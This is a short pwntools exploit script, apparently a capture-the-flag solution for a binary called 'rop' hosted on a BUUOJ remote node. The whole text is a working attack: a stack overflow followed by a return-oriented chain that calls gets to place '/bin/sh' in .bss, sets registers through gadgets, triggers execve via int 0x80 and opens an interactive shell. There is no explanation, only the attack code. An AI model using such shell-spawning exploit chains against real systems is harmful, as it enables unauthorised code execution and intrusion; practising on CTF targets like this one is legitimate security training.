from pwn import*
elf=ELF('./rop')
#p=process('./rop')
p=remote('node4.buuoj.cn',28908)
bss=0x80ec2a8
gets=0x804f0d0
pop_edx_ecx_ebx=0x806ed00
pop_eax=0x80b8016
int_80=0x806c943
payload=0x10*b'a'+p32(gets)+p32(pop_eax)+p32(bss)+p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss)+p32(pop_eax)+p32(0xb)+p32(int_80)

p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()